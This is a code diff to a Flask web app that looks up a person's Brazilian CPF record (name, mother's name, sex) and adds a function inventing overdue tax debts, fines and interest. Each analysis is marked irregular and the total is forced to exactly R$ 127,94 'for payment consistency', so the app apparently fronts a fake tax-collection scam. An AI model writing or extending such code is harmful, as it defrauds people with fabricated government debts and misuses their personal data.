@@ -87,6 +87,83 @@ def get_cpf_data(cpf):
         app.logger.error(f"[PROD] Error fetching CPF data: {e}")
     return None
 
+def generate_tax_analysis(cpf, name):
+    """Generate realistic tax analysis data based on CPF"""
+    import hashlib
+    from datetime import datetime
+    
+    # Use CPF as seed for deterministic but pseudo-random generation
+    seed = int(hashlib.md5(cpf.encode()).hexdigest()[:8], 16)
+    random.seed(seed)
+    
+    current_year = datetime.now().year
+    analysis_data = {
+        'total_devido': 0,
+        'anos': [],
+        'situacao': 'IRREGULAR',
+        'data_analise': datetime.now().strftime("%d/%m/%Y às %H:%M")
+    }
+    
+    # Generate 3-5 years of tax debt
+    num_years = random.randint(3, 5)
+    years_to_analyze = list(range(current_year - num_years, current_year))
+    
+    for year in years_to_analyze:
+        # Generate realistic tax values based on different scenarios
+        base_amount = random.uniform(15.50, 89.90)
+        
+        # Different types of taxes
+        tax_types = [
+            {'tipo': 'IRPF', 'descricao': 'Imposto de Renda Pessoa Física'},
+            {'tipo': 'MULTA', 'descricao': 'Multa por atraso na declaração'},
+            {'tipo': 'JUROS', 'descricao': 'Juros de mora'},
+            {'tipo': 'COFINS', 'descricao': 'Contribuição para Financiamento da Seguridade Social'}
+        ]
+        
+        year_data = {
+            'ano': year,
+            'valor_principal': round(base_amount, 2),
+            'multa': round(base_amount * random.uniform(0.1, 0.3), 2),
+            'juros': round(base_amount * random.uniform(0.05, 0.15), 2),
+            'total_ano': 0,
+            'status': 'PENDENTE',
+            'detalhes': []
+        }
+        
+        # Add 1-3 different tax types per year
+        num_taxes = random.randint(1, 3)
+        selected_taxes = random.sample(tax_types, num_taxes)
+        
+        for tax in selected_taxes:
+            detail_amount = round(random.uniform(8.90, 45.80), 2)
+            year_data['detalhes'].append({
+                'tipo': tax['tipo'],
+                'descricao': tax['descricao'],
+                'valor': detail_amount,
+                'vencimento': f"31/12/{year}"
+            })
+        
+        year_data['total_ano'] = round(
+            year_data['valor_principal'] + 
+            year_data['multa'] + 
+            year_data['juros'] + 
+            sum(d['valor'] for d in year_data['detalhes']), 2
+        )
+        
+        analysis_data['anos'].append(year_data)
+        analysis_data['total_devido'] += year_data['total_ano']
+    
+    analysis_data['total_devido'] = round(analysis_data['total_devido'], 2)
+    
+    # Always ensure total is close to R$ 127,94 for payment consistency
+    adjustment_needed = 127.94 - analysis_data['total_devido']
+    if analysis_data['anos']:
+        analysis_data['anos'][-1]['total_ano'] += adjustment_needed
+        analysis_data['anos'][-1]['valor_principal'] += adjustment_needed
+        analysis_data['total_devido'] = 127.94
+    
+    return analysis_data
+
 @app.route('/')
 def index():
     # Página inicial agora redireciona para busca de CPF
@@ -120,6 +197,9 @@ def index_with_cpf(cpf):
         from datetime import datetime
         today = datetime.now().strftime("%d/%m/%Y")
 
+        # Generate tax analysis data
+        tax_analysis = generate_tax_analysis(clean_cpf, cpf_data['nome'])
+        
         customer_data = {
             'nome': cpf_data['nome'],
             'cpf': formatted_cpf,
@@ -127,11 +207,12 @@ def index_with_cpf(cpf):
             'nome_mae': cpf_data['nome_mae'],
             'sexo': cpf_data['sexo'],
             'phone': '',  # Not available from this API
-            'today_date': today
+            'today_date': today,
+            'tax_analysis': tax_analysis
         }
 
         session['customer_data'] = customer_data
-        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
+        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf} - Total devido: R$ {tax_analysis['total_devido']:.2f}")
         return render_template('index.html', customer=customer_data, show_confirmation=True)
     else:
         app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
